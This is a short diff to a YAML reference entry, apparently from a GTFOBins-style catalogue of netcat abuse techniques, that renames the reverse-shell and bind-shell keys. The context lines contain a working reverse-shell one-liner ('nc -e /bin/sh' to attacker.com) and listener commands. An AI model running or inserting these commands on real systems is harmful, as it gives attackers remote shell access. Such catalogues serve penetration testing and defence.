@@ -14,13 +14,13 @@ functions:
         LPORT=12345
         LFILE=where_to_save
         nc -l -p $LPORT > "$LFILE"
-  reverse-shell:
+  reverse-shell-interactive:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         RHOST=attacker.com
         RPORT=12345
         nc -e /bin/sh $RHOST $RPORT
-  bind-shell:
+  bind-shell-interactive:
     - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
       code: |
         LPORT=12345
